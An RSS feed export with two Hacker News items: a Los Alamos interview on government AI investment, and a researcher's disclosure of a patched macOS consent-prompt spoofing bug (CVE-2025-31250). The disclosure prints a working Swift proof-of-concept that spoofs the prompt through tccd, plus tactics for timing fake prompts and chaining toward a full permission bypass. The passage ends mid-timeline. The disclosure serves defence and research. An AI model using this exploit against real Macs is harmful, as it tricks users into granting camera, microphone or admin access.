<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Tue, 13 May 2025 00:30:03 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Why National Labs are investing (heavily) in AI (106 pts)]]></title>
            <link>https://www.lanl.gov/media/publications/1663/0125-qa-jason-pruet</link>
            <guid>43966843</guid>
            <pubDate>Mon, 12 May 2025 19:52:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.lanl.gov/media/publications/1663/0125-qa-jason-pruet">https://www.lanl.gov/media/publications/1663/0125-qa-jason-pruet</a>, See on <a href="https://news.ycombinator.com/item?id=43966843">Hacker News</a></p>
<div id="readability-page-1" class="page"><section><section><h2>A conversation about AI for science with Jason Pruet, Director of the Laboratory’s National Security AI Office.</h2><p>March 31, 2025</p></section><div><p><a href="https://cdn.lanl.gov/files/1663-45-qa-jason-pruet_2f929.pdf" target="_blank" rel="noopener">Download a print-friendly version of this article.</a></p><p>Jason Pruet is working with teams across the Laboratory to help prepare for a future in which artificial intelligence will reshape the landscape of science and security. Five years ago, he viewed AI as just another valuable tool, but because of recent advances in the power of large AI models, Pruet now believes AI will be broadly disruptive. He no longer views the technology as just a tool, but as a fundamental shift in how scientists approach problems and make discoveries. The global race humanity is now in is about how to harness the technology’s potential while mitigating its harms.</p><p><strong>1663: </strong>&nbsp;This year, the Lab invested more in AI-related work than at any point in history. You’ve spoken about government investment in AI in terms of returning to a post–World War II paradigm of science for the public good. Can you expand on that?</p><p><strong>JP:</strong> &nbsp;Before World War II, the government wasn’t really involved in science the way we think of it today. But after WWII, Vannevar Bush, a key figure behind the Manhattan Project, laid the groundwork for permanent government support of science and engineering. I’m paraphrasing here, but he had this beautiful quote where he said, “Just as it’s been the policy of the government to keep the frontiers of exploration open for everyone, so it’s the policy of the government that the frontiers of knowledge are open for everyone.”</p><p>That uniquely American idea helped build the American Century. After the war, Los Alamos leadership realized that the future of security and science depended on the ability to study energetic particles and nuclear reactions. The problem was that no university could do it because they didn’t have the means to build these giant machines. And the Lab couldn’t do it without the support of the universities, so they made a deal where the Atomic Energy Commission would pay for these giant facilities, like the Stanford Linear Accelerator Center. Without that kind of infrastructure, the country had no credible way of being a scientific superpower anymore.&nbsp;</p><p>For a variety of reasons, government support for big science has been eroding since then. Now, AI is starting to feel like the next great foundation for scientific progress. Big companies are spending billions on large machines, but the buy-in costs of working at the frontiers of AI are so high that no university has the exascale-class machines needed to run the latest AI models. We’re at a place now where we, meaning the government, can revitalize that pact by investing in the infrastructure to study AI for the public good.</p><p><strong>1663: </strong>&nbsp;That’s a fascinating parallel. You mentioned the massive infrastructure required for cutting-edge AI research. Is that something universities can collaborate on with Los Alamos?</p><p><strong>JP:</strong> &nbsp;Exactly. Part of what we’re doing with the Lab’s machines, like Venado—which has 2500 GPUs—is giving universities access to that scale of computing. The scale is just completely different. A typical university might have 50 or 100 GPUs.<br>Right now, for example, we have partnerships with the University of California, the University of Michigan, and many other universities where researchers can tap into this infrastructure. That’s something we want to expand on. Having university collaboration will be critical if the Department of Energy is going to have a comprehensive AI program at scale that is focused on national security and energy dominance.&nbsp;</p><p><strong>1663:</strong> &nbsp;What changed in the last few years to enable this rapid progress? Is it just bigger models, or is there something else at play?</p><p><strong>JP:</strong> &nbsp;One of the biggest shifts came from a 2017 paper called “Attention Is All You Need,” written by a small group of Google researchers. This paper introduced the transformer architecture, which allowed for a huge leap in how we could scale AI models. It turns out that the bigger the model, the better it performs. Transformers also allow for mixing different types of information—text, images, equations—all within a single framework.&nbsp;</p><p><strong>1663:</strong> &nbsp;Has your perspective on AI shifted since the development of the transformer model?</p><p><strong>JP:</strong> &nbsp;Definitely. There was a time when I wouldn’t have advocated for government investment in AI at the scale we’re seeing now. But the weight of the evidence has become overwhelming. Large models— “frontier models”—have shown such extraordinary capabilities with recent advances in areas as diverse as hypothesis generation, mathematics, biological design, and complex multiphysics simulations. The potential for transformative impact is too significant to ignore.&nbsp;</p><p><strong>1663:</strong> &nbsp;Can you describe where we are on the trajectory of AI development?</p><p><strong>JP:</strong> &nbsp;That’s a tricky question because we really don’t understand the full potential of this technology yet. The AI community uses different benchmarks to test the capabilities: one each for math, verbal reasoning, symbolic reasoning, theory of mind, the bar exam. Over the last two years, we’ve more or less run out of benchmarks where AI isn’t better than humans. An exception is for a particular class of abstract reasoning, though I’d be surprised if that benchmark doesn’t also fall in the next year.&nbsp;</p><p>The basic problem with this technology is that we don’t fully understand it. We have no predictive ability to say, “Oh, if I do 10 times more compute, then this will happen.” My colleague Juston Moore has emphasized that there would be a great strategic advantage for the nation that first develops an ability to scientifically understand AI models. Absent that, there’s a deep argument within the community about whether we’re near the top or the bottom. What is clear is that the speed of progress is faster than anyone could have predicted, and there’s no indication that it will slow anytime soon.</p><p><strong>1663:</strong> &nbsp;Is it fair to think of this moment as an international arms race over AI?</p><p><strong>JP:</strong> &nbsp;I want to start with a historical analogy. In the industrial revolution, the focus shifted from humans and animals doing manual labor to building machines for mechanical labor. In the AI revolution, we’re going from cognitive labor being done by humans to cognitive labor being done by machines. If you’ve played with the most recent AI tools, you know: They’re very good coders, very good legal analysts, very good first drafters of writing, very good image generators. They’re only going to get better. Viewed through the lens of machines becoming the basis for the next generation of cognitive labor, it’s obvious what the strategic significance of these tools is.</p><p>So yes, it’s becoming more likely that AI will be a means by which nations gain strategic and potentially decisive advantages. China’s leadership sees AI as a general-purpose technology, much like electricity or the internal combustion engine—something that can drive progress across many areas of life, from the economy to defense. After DeepMind’s AlphaGo defeated the Chinese grandmaster Ke Jie in May 2017, within three to six months, China’s government launched a national AI strategy. What China saw from that was that if your goal is strategic dominance through subtle means, then for the first time in human history, we have a technology that can do that.</p><p>Let me give you another example of how AI is already changing power structures. I have a friend, Chuck Mielke, who works here at the Lab and often reviews papers written by researchers from rural Chinese universities. For years, he’d get these papers, and they were so hard to get through, so hard to understand. Then, suddenly, new AI technologies came out, and the papers he received were beautifully written and argued. For decades, the U.S. has had a structural advantage because English is the dominant language in scientific literature. AI eroded that overnight.&nbsp;</p><p>All that said, I’m increasingly uncomfortable viewing this through the lens of a traditional arms race. Many thoughtful and respected people have emphasized that AI poses enormous risks for humanity. There are credible reports that China’s leadership has come to the same view, and that internally, they are trying to better balance the potential risks rather than recklessly seek advantage. It may be that the only path for managing these risks involves new kinds of international collaborations and agreements.</p><p><strong>1663: </strong>&nbsp;What’s the message you want scientists at the Lab to take away from all of this?&nbsp;</p><p><strong>JP:</strong> &nbsp;My sense is that most of our researchers have a deep appreciation of the significance of these technologies. Whether it’s for scientific research, manufacturing, operations, or even legal and public affairs, AI is going to be the driving force behind how we do things moving forward. This isn’t just a tool; it’s a fundamental shift in how we approach problems and make discoveries. We’re at a point now where the potential of the technology has been demonstrated to such an extent that the question is really about the pace of adoption. The recent release by OpenAI of new models capable of pretty good step-by-step reasoning only reinforces this view.</p><p><strong>1663:</strong> &nbsp;How does that make you feel?</p><p><strong>JP:</strong> &nbsp;Like we’re behind. The ability to use machines for general-purpose reasoning represents a seminal advance with enormous consequences. This will accelerate progress in science and technology and expand the frontiers of knowledge. It could also pose disruptions to national security paradigms, educational systems, energy, and other foundational aspects of our society. As with other powerful general-purpose technologies, making this transition will depend on creating the right ecosystem. To do that, we will need new kinds of partnerships with industry and universities.</p><p><strong>1663:</strong> &nbsp;Do you think we’re heading toward a future where every country will develop its own AI capabilities?</p><p><strong>JP: </strong>&nbsp;For nations that can afford it, yes. Countries like the UK, China, and France have already been clear about their intentions to develop their own sovereign AI capabilities. The United Arab Emirates invested billions of dollars from its sovereign wealth funds because it recognized the significance of this technology. It’s like—you can’t have somebody else control your oil, you can’t have somebody else control your food, and now, you can’t have somebody else control your AI.</p><p>To get back to the Vannevar Bush thing we were discussing earlier: One could say, “Why don’t we just let private industry build these giant engines for progress and science, and we’ll all reap the benefits?” The problem is that if we’re not careful, it could lead us to a very different country than the one we’ve been in. We certainly need to partner with industry. Because they are so far ahead and are making such giant investments, that is the only possible path. But at the same time, we’ll need to figure out how to preserve Vannevar’s pact.</p><h3 id="ask">People also ask</h3><ul>  <li><strong>What are some of the risks of AI?</strong> The doomsday scenario is that AI becomes more powerful than humans, posing an existential risk to humanity, but far more likely, nearer term concerns include job replacement, privacy breaches, and threats to security. All of these risks and more factored into the decision for Los Alamos National Laboratory to invest heavily in understanding and shaping the technology to prevent harm and help realize its vast potential for improving the world.</li>  <li><strong>How can AI help in my job?</strong> From automating processes to drafting memos or optimizing supply chains—AI can help accelerate many aspects of a wide variety of modern jobs. As one expert at Los Alamos National Laboratory puts it, “AI isn’t just a tool; it’s a fundamental shift in how we approach problems.” The task ahead for many workers will be adopting it quickly, smartly, and securely. &nbsp;</li></ul></div><section><h4>Share</h4><ul><li><a title="Facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.lanl.gov%2Fmedia%2Fpublications%2F1663%2F0125-qa-jason-pruet"></a></li><li><a title="Twitter" href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fwww.lanl.gov%2Fmedia%2Fpublications%2F1663%2F0125-qa-jason-pruet&amp;text="></a></li><li><a title="LinkedIn" href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.lanl.gov%2Fmedia%2Fpublications%2F1663%2F0125-qa-jason-pruet"></a></li><li><a title="Pinterest" href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fwww.lanl.gov%2Fmedia%2Fpublications%2F1663%2F0125-qa-jason-pruet&amp;media=&amp;description="></a></li><li><a title="Email" href="mailto:?subject='Check%20out%20this%20great%20article'&amp;body=Check%20out%20this%20article%20I%20found%20on%20Los%20Alamos%20National%20Laboratory's%20website:%20https://www.lanl.gov/media/publications/1663/0125-qa-jason-pruet"></a></li></ul></section></section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Can you trust that permission pop-up on macOS? (133 pts)]]></title>
            <link>https://wts.dev/posts/tcc-who/</link>
            <guid>43966089</guid>
            <pubDate>Mon, 12 May 2025 18:26:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://wts.dev/posts/tcc-who/">https://wts.dev/posts/tcc-who/</a>, See on <a href="https://news.ycombinator.com/item?id=43966089">Hacker News</a></p>
<div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">
    <header>
      
      
      <img alt="A dialog box that reads 'System Settings would like to administer your computer. Administration can include modifying passwords, networking, and system settings.'" src="https://wts.dev/posts/tcc-who/consent-prompt.png" height="700">
    </header>
    <h2>Introduction</h2>
    <p>It's time to update your Macs again! This time, I'm not burying the lede. <b>CVE-2025-31250</b>, which was patched in today's releases of macOS Sequoia 15.5 et al., allowed for…</p>
    <ol>
      <li>…any <b>Application A</b> to make macOS show a permission consent prompt…</li>
      <li>…appearing as if it were coming from any <b>Application B</b>…</li>
      <li>…with the results of the user's consent response being applied to any <b>Application C.</b></li>
    </ol>
    <p>These did not have to be different applications. In fact, in most normal uses, they would all likely be the same application. Even a case where Applications B and C were the same but different than Application A would be relatively safe (if somewhat useless from Application A's perspective). However, prior to this vulnerability being patched, a lack of validation allowed for Application B (the app the prompt <em>appears</em> to be from) to be different than Application C (the <em>actual</em> application the user's consent response is applied to).</p>
    <p>Spoofing these kinds of prompts is not exactly new. In fact, <a href="https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/index.html#tcc-request-by-arbitrary-name">the HackTricks wiki has had a tutorial on how to perform a similar trick on their site for a while.</a> However, their method requires:</p>
    <ol>
      <li>the building of an entire fake app in a temporary directory,</li>
      <li>the overriding of a shortcut on the Dock, and</li>
      <li>the simple hoping that the user clicks on the (now) fake shortcut.</li>
    </ol>
    <p>This vulnerability requires <strong><em>none of the above.</em></strong></p>
    <h2>TCC</h2>
    <p>As I explained in <a href="https://wts.dev/posts/tcc-sql-injection/#TCC">my first ever article on this site,</a> TCC is the core permissions system built into Apple's operating systems. It is used by sending messages to the <code>tccd</code> daemon (or rather, by using functions in the private <code>TCC</code> framework). The framework is a private API, so developers don't call the functions directly (instead, public API's call the functions under-the-hood as needed). However, all this wrapping cannot hide the fact that the control mechanism is still simply sending messages to the daemon.</p>
    <p>The daemon uses Apple's public (but proprietary) <a href="https://developer.apple.com/documentation/xpc">XPC API</a> for messaging (specifically the lower-level dictionary-based API). Prior to this vulnerability being patched, any app with the ability to send XPC messages to <code>tccd</code> could send it a specifically-crafted message that, as described above, would make it display a permission prompt as if it were from one app but then apply the user's response to a completely separate app. But how was this possible, and was it even hard? Before I answer these questions, we need to detour into what will, at first, seem like a completely unrelated topic.</p>
    <h2>Apple Events</h2>
    <h3>What are Apple Events?</h3>
    <p><b>Apple Events</b> are a method of inter-process communication on macOS. As of writing, if you <a href="https://www.google.com/search?&amp;q=site:developer.apple.com+%22apple+events%22&amp;udm=14">search <code>site:developer.apple.com "apple events"</code> on Google,</a> one of the very first results will likely be <a href="https://developer.apple.com/library/archive/documentation/mac/pdf/Interapplication_Communication/Intro_to_Apple_Events.pdf">this PDF document titled <cite>Introduction to Apple Events</cite>.</a> Skimming through this PDF, you could be forgiven for thinking the contents are at all relevant to modern-day programming. You might find it strange that it starts at Chapter 3, but you may then <a href="https://www.google.com/search?q=inurl:https://developer.apple.com/library/archive/documentation/mac/pdf/Interapplication_Communication&amp;udm=14">search and find the other PDFs that comprise the book.</a></p>
    <p>Looking closer at the book, you might start to get confused at some of the code snippets. It's not until looking closer that you realize… <a href="https://developer.apple.com/library/archive/documentation/mac/pdf/Interapplication_Communication/Scripting_Components.pdf">some of this code is Pascal.</a> You may then hurriedly search the name of the book and find <a href="https://www.amazon.com/Inside-Macintosh-Interapplication-Communication-Technical/dp/0201622009">an Amazon listing</a> that includes the publication date: <time datetime="1993-01-01">January 1, 1993</time>. This is an old book. It predates Mac OS X, and is actually from the era prior (now retroactively known as <a href="https://en.wikipedia.org/wiki/Classic_Mac_OS">Classic Mac OS</a>). So wait, if this protocol is that old, why am I talking about it now, in 2025, in the context of modern macOS?</p>
    <p>The situation I described above happened to me as I was searching for resources on Apple Events. I was looking into the protocol because really… Apple Events are <em>still</em> part of macOS. While the new kernel introduced with Mac OS X required the technology to be re-architected, the concept and general use still exists to this day.</p>
    <p>The most common use-case for Apple events today is automation (telling a app to perform a specific action or set of actions). This can be scripted through the use of Apple's <a href="https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/HowMacScriptingWorks.html">Open Scripting Architecture.</a> The primary language used for these scripts is <a href="https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html">AppleScript,</a> but <a href="https://en.wikipedia.org/wiki/JavaScript_OSA">JavaScript can also be used.</a> This is similar to the <a href="https://en.wikipedia.org/wiki/Windows_Script_Host">Windows Script Host</a> on Windows. And, like on Windows, <a href="https://www.youtube.com/watch?v=Nlnuk8W2A0Y">this scripting has been used as a vector for malware.</a></p>
    <h3>Apple Events and TCC</h3>
    <p>So what does this have to do with TCC? Well, <a href="https://developer.apple.com/videos/play/wwdc2019/701/?time=2195">as of macOS Mojave 10.14, the sending of Apple Events by an app requires specific user consent via TCC.</a> However, attempting to add Apple Events to TCC likely posed a challenge to Apple. Note that much of the following is speculation and I don't want to have to dig up old versions of TCC to validate my theories. However, I do believe they are likely fairly accurate.</p>
    <p>As I explained in my previous article, TCC stores user consent results in an SQLite database file located at <code>[User Home  Folder]/Application Support/com.apple.TCC/TCC.db</code>. While it might seem strange to have such sensitive data stored out in the open, this file (and the directory containing it) are generally well-protected. However, this setup <em>has</em> been exploited multiple times in the past. You might already see the potential flaw. Let's put a pin in that and we'll come back to it later on in the article.</p>
    <p>Back to the database: among other columns, each row of <code>TCC.db</code> has</p>
    <ol>
      <li>a column for the app requesting a permission (or rather <q>service</q>, as TCC would call it),</li>
      <li>a column for the service the app requested, and</li>
      <li>a column for the user's consent response.</li>
    </ol>
    <p>This model works great when there is a single resource behind a service. However, with Apple Events, the resource could be any receiving app. Apple's engineers <em>could</em> have simply added an <q>Apple Events</q> service which, when permission is granted to an application, would allow it to send Apple Events to <em>any</em> app. However, this would still leave the door open for abuse. Instead Apple decided to limit user consent for the sending of Apple Events on a per-receiving-app basis. But how could they do this?</p>
    <p>Rows in <code>TCC.db</code> that denote user consent responses for Apple Events use a <em>fourth</em> column: the <q>indirect object</q> column. An identifier for the receiving app is placed in this column. While I have only ever seen it used with Apple Events, <a href="https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive">there is apparently one other service, <code>FileProviderDomain</code>, that uses it.</a> It's unclear to me if this column existed prior to the Mojave update, but I wouldn't be surprised if it was added <em>for</em> Apple Events, and the uses for other services came later. I could be wrong, but, again, I don't want to dig up old TCC releases to check. I'll leave that as an exercise for the reader.</p>
    <p>Anyway, as many consent interactions with TCC do not require the use of this column, the TCC daemon handles messages that do and don't require it (among the many other functions of the daemon) separately. This is done through the string value of the <code>function</code> key in the XPC dictionary messages sent to the daemon. Specifically, the <code>TCCAccessRequestIndirect</code> function of the daemon handles messages that need to use the <q>indirect object</q> column in the resulting row that would be appended to the database.</p>
    <p>The <code>TCCAccessRequestIndirect</code> function included a logic bug that resulted in the behavior I described at the start of this article: where a sender could specify one app which would be used to build and display the user consent prompt while also specifying another that would actually be inserted into the database as the one that requested the service. This bug did not exist in other access-request functions.</p>
    <h2>Proof-of-Concept</h2>
    <pre><code>class TCCPromptSpoofer {
      public enum Error: Swift.Error {
          case actualBundleHasNoIdentifier
          case spoofedBundleHasNoExecutablePath
  
          case failedToCreateSecStaticCode(OSStatus)
          case failedToCopySigningInformation(OSStatus)
          case failedToGetRequirementData(OSStatus)
  
          case requirementsDataHasNoBaseAddress
      }
      /// Spoof a TCC prompt.
      /// - Parameters:
      ///   - spoofedBundle: The bundle that will be shown in the prompt.
      ///   - actualBundle: The bundle that will actually receive the permissions.
      ///   - service: The service to spoof.
      ///   - indirectObject: The indirect object to spoof (mainly used for the AppleEvents service).
      ///   - useCSReq: Wether to send the code signature requirements to the TCC daemon.
      /// - Returns: Whether the user accepted the prompt.
      @discardableResult
      public static func spoofPrompt(
          spoofedBundle: Bundle,
          actualBundle: Bundle,
          service: String,
          indirectObject: String? = nil,
          useCSReq: Bool = false
      ) throws -&gt; Bool {
          // We need an actual bundle with an identifier for this to work.
          guard let actualBundleID = actualBundle.bundleIdentifier else {
              throw self.Error.actualBundleHasNoIdentifier
          }
          // We also need a spoofed bundle with an executable path for this to work.
          guard let spoofedExecutablePath = spoofedBundle.executablePath else {
              throw self.Error.spoofedBundleHasNoExecutablePath
          }
  
          // We need to create an XPC dictionary to send to the TCC daemon.
          let xpcDict = xpc_dictionary_create(nil, nil, 0)
          xpc_dictionary_set_string(xpcDict, "function", "TCCAccessRequestIndirect")
          xpc_dictionary_set_string(xpcDict, "service", "kTCCService\(service)")
          // A `target_prompt` value of 2 is the only one without special handling in the TCC daemon, so we use that.
          xpc_dictionary_set_int64(xpcDict, "target_prompt", 2)
  
          // &lt;key_part_of_exploit&gt;
  
          // This is the value that will end up being put into the database, giving the actual bundle the permissions.
          xpc_dictionary_set_string(xpcDict, "target_identifier", actualBundleID)
          xpc_dictionary_set_int64(xpcDict, "target_identifier_type", 0)  // A type of 0 means a bundle identifier.
  
          // This is the value that will be used to get the display name of the requesting app for use in the prompt.
          xpc_dictionary_set_string(xpcDict, "target_path", spoofedExecutablePath)
  
          // &lt;/key_part_of_exploit&gt;
  
          // We make the requirements blob here.
          let requirementsBlob =
              useCSReq
              // We need to get the code signature requirements data of the actual bundle.
              ? try {
                  // Make a static code object from the actual bundle.
                  var staticCode: SecStaticCode?
                  let staticCodeCreateStatus = SecStaticCodeCreateWithPath(
                      actualBundle.bundleURL as CFURL, [], &amp;staticCode
                  )
                  guard
                      staticCodeCreateStatus == errSecSuccess,
                      let secStaticCode = staticCode
                  else {
                      throw self.Error
                          .failedToCreateSecStaticCode(staticCodeCreateStatus)
                  }
  
                  // Get the signing information of the actual bundle.
                  var information: CFDictionary?
                  let copySigningInformationStatus = SecCodeCopySigningInformation(
                      secStaticCode, .init(rawValue: kSecCSRequirementInformation), &amp;information
                  )
                  guard
                      copySigningInformationStatus == errSecSuccess,
                      let signingInformation = information as? [String: Any]
                  else {
                      throw self.Error
                          .failedToCopySigningInformation(copySigningInformationStatus)
                  }
  
                  // Get the code signature requirements data of the actual bundle.
                  guard
                      let requirementsData = signingInformation[kSecCodeInfoRequirementData as String]
                          as? Data
                  else {
                      throw self.Error
                          .failedToGetRequirementData(copySigningInformationStatus)
                  }
                  return requirementsData
              }()
              // We still need to send *something* as the requirements blob, so fallback to an empty Data object.
              : Data()
  
          // Now we put the requirements blob from above into the XPC dictionary.
          try requirementsBlob.withUnsafeBytes { bufferPointer in
              // This should probably never happen, but it's better to be safe than sorry.
              guard let baseAddress = bufferPointer.baseAddress else {
                  throw self.Error.requirementsDataHasNoBaseAddress
              }
              // We copy the buffer to a new pointer as, per the documentation, the buffer pointer is only valid
              // within the block. This new pointer, while it is defined within the block, should not be subject
              // to the same restrictions (hopefully), so it should be safe to put into the XPC dictionary.
              let newPointer = UnsafeMutablePointer<uint8>.allocate(capacity: bufferPointer.count)
              newPointer.initialize(
                  from: baseAddress.bindMemory(to: UInt8.self, capacity: bufferPointer.count),
                  count: bufferPointer.count
              )
              xpc_dictionary_set_data(
                  xpcDict, "target_csreq",
                  newPointer, bufferPointer.count
              )
          }
  
          // This key is required by the function, so we either pass in a user-provided value or an empty string.
          xpc_dictionary_set_string(xpcDict, "indirect_object_identifier", indirectObject ?? "")
  
          // A `target_prompt` value of 2 is the only one without special handling in the TCC daemon, so we use that.
          xpc_dictionary_set_int64(xpcDict, "target_prompt", 2)
  
          // Finally, we send the XPC dictionary to the TCC daemon.
          let connection = xpc_connection_create_mach_service("com.apple.tccd", nil, 0)
          xpc_connection_set_event_handler(connection) { _ in }
          xpc_connection_resume(connection)
          let reply = xpc_connection_send_message_with_reply_sync(connection, xpcDict)
          let didAccept = xpc_dictionary_get_bool(reply, "result")
          return didAccept
      }
  }</uint8></code></pre>
    <p>The above code may seem complicated, but really, not all of it is necessary or relevant. The logic bug itself was quite simple. Put simply, when sending an XPC dictionary message to <code>tccd</code> for the <code>TCCAccessRequestIndirect</code> function (and with a <code>target_prompt</code> of <code>2</code>)…</p>
    <ol>
      <li>…the name of the bundle at the path passed via the <code>target_path</code> key would be used for the GUI consent prompt…</li>
      <li>…while the bundle represented by the bundle ID passed via the <code>target_identifier</code> key would be the actual one inserted into the database.</li>
    </ol>
    <p>Additionally, despite this specifically being a function <em>for</em> access requests with indirect objects, you could just specify an empty string as the indirect object and use the function for several other TCC services that didn't use that column. As for why the TCC daemon has two different fields that can be specified separately when they (logically) should always refer to the same thing: I have no idea. And while this vulnerability would still require the user to respond in the affirmative, it ultimately opened up a way to spoof TCC prompts as if they were coming from any other app on the user's machine. That was obviously not ideal.</p>
    <h2>Exploiting this Vulnerability</h2>
    <h3>Limitations and Quirks</h3>
    <p>Another limitation of this vulnerability was that it could only be used with a specific set of TCC services. However, this included many of the major ones such as Microphone, Camera, and the like. Consent prompts for access to specific directories could also be spoofed, but additional layers of security around files made it not very useful (although, unrelated, <a href="https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/">Apple did recently patch a filesystem-based sandbox escape</a>).</p>
    <p>An interesting factor of this vulnerability is that a malicious app could use it and have the user's consent result ultimately apply to <em>another</em> app. While this might not seem useful at first, it might be helpful for sophisticated attacks wherein an attacker has found a way to control another app, but still needs that app to have user consent to a TCC service in order to actually utilize it to its full potential.</p>
    <h3>Timing The Exploit</h3>
    <p>Timing <em>when</em> to show a spoofed prompt is key when exploiting this vulnerability. If a TCC consent prompt were to <em>randomly</em> appear to a user, they would likely view it with suspicion and click <q>Don't Allow</q>. However, if one were to appear at the correct time, the user might end up clicking <q>Allow</q>.</p>
    <p>But when exactly is <q>the correct time</q>? I'll answer that question with a question: did you know that, on macOS, an app can often easily <a href="https://developer.apple.com/documentation/appkit/nsworkspace/runningapplications">view the list of running applications</a> and can even <a href="https://developer.apple.com/documentation/appkit/nsworkspace/frontmostapplication">see which one is currently on top?</a> All a malicious app would have to do is lie in wait for a specific app to launch and/or become the <q>frontmost</q> app, and only <em>then</em> show a spoofed prompt with the name of that app. As it would appear when the user opens or switches to the app, they might be tricked into thinking the prompt came from that app.</p>
    <p>For example, an attacker could wait for the user to open FaceTime before showing a spoofed consent prompt for Camera permissions (hoping that the user doesn't see the FaceTime window already using their camera underneath the prompt). A potentially more fruitful path would be to wait until the user opens Voice Memos and then spoof a prompt for Microphone access. There are several other hypothetical scenarios, but those are two that come to mind. There is one more, though, that could chain into a complete TCC bypass.</p>
    <h3>Revisiting An Old Exploit</h3>
    <p>The astute among you might have wondered earlier: <q>if the location of the <code>TCC.db</code> database is dependent on the user's home folder, how is that determined?</q>. The answer to your question depends on <em>when</em> you're asking. Prior to updates released in mid-July of 2020, <a href="https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8">the <code>tccd</code> daemon simply used the <code>HOME</code> environment variable</a> This vulnerability (<a href="http://x.com/mattshockl/status/1480612268857507841">retroactively named $HOMERun by the researcher</a>), opened up a trivial TCC bypass that was as simple as planting a fake <code>TCC.db</code> in the correct path off of a fake home folder and then setting the value of the <code>HOME</code> environment variable to that fake home folder.</p>
    <p>After the above was patched, the TCC daemon now queries the operating system's user info directory for the user's home folder. This is the proper way it should be done, as it is much more resistant to exploits. But it is not completely resistant. <a href="https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/">Wojciech Reguła, who I mentioned in one of my previous write-ups, found a way to abuse the plugin system of the GUI user info directory editor built into macOS,</a> while <a href="https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/">the Microsoft Threat Intelligence team found a bypass they called <q>powerdir</q> using built-in import and export commands.</a></p>
    <p>There are two things an app generally needs to change the user's home folder. The first is root access. Neither of the above were able to bypass this requirement, and neither was this vulnerability able to do so. However, both of the above were able to bypass the second requirement: user consent to a specific TCC service. While this vulnerability cannot <em>completely</em> bypass this requirement, it <em>can</em> be used to present the user with a spoofed consent prompt for that specific TCC service, hoping that they click <q>Allow</q>.</p>
    <img alt="A dialog box that reads 'System Settings would like to administer your computer. Administration can include modifying passwords, networking, and system settings.'" src="https://wts.dev/posts/tcc-who/consent-prompt.png" height="700">
    <p>Consider the above prompt. Would you click <q>Allow</q>? If you've read this far in the article your answer is probably <q>no</q>. But think about if you hadn't read this article. If this prompt appeared <em>when you opened the System Settings app</em>, would you click <q>Allow</q> then? Maybe something else would tip you off. Maybe you would wonder <q>shouldn't the System Settings app already have permission to do this?</q> Perhaps, if you were skeptical enough, you would still click <q>Don't Allow</q>. But I don't think that's what <em>everyone</em> would do.</p>
    <p>In this hypothetical example, if you were unfortunate enough to be tricked by the above prompt and click <q>Allow</q> you would be giving some unknown app half of what it needs to ultimately change your home folder, plant a fake <code>TCC.db</code>, and bypass the real database. Those who read <a href="https://wts.dev/posts/tcc-sql-injection/">my first article</a> might wonder about <code>REG.db</code>, the database that keeps track of all valid <code>TCC.db</code> databases. Well, unfortunately, TCC provides a function for any app to simply add an entry to <code>REG.db</code>. Thus, even if it would have stood in the way of this exploit, it can be effectively thwarted by simply adding an entry with the path to the planted <code>TCC.db</code>.</p>
    <p>After receiving the tricked consent above, all the malicious app would need to do is find a way to escalate to root and use that (and the above) to modify the user info directory and change the user's home folder.</p>
    <p>To be transparent, I did not automate this process. I leave that as an exercise for the reader, if they so desire. However, I did manually play around with changing my home folder (and adding entries to <code>REG.db</code>) and did observe TCC using both my real database and one I planted (behaving differently with each as their contents diverged). This makes sense, as operating from any home folder is a legitimate use case for TCC.</p>
    <p>Ultimately, changing the user's home folder and planting a fake <code>TCC.db</code> (while also potentially adding an entry for it in <code>REG.db</code>) will likely be a viable exploit path now and into the future. Attackers and security researchers will just have to find new ways of breaking their way into modifying the user info directory.</p>
    <h2>Timeline</h2>
    <p>Something interesting to note is this: despite this not being my second ever article, this <em>was</em> the second ever bug I reported to Apple. It's taken a <em>long</em> time for Apple to ultimately patch this. By far, of the bugs I have reported (and that Apple has patched) this one has taken the longest amount of time to be patched:</p>
    <table id="timeline">
      <thead>
        <tr>
          <th scope="col">Date</th>
          <th scope="row">Event</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><time datetime="2024-05-02">2024-05-02</time></td>
          <td>I file the initial report with Apple Product Security (+ several additional clarifying messages)</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-03">2024-05-03</time></td>
          <td>Apple Product Security responds, asking for clarification (+ my response)</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-03">2024-05-03</time></td>
          <td>Later in the day, I discover the potential full TCC bypass and inform Apple Product Security</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-04">2024-05-04</time></td>
          <td>I leave several additional update messages as I continue testing my PoC</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-06">2024-05-06</time></td>
          <td>Apple Product Security thanks me for the information</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-15">2024-05-15</time></td>
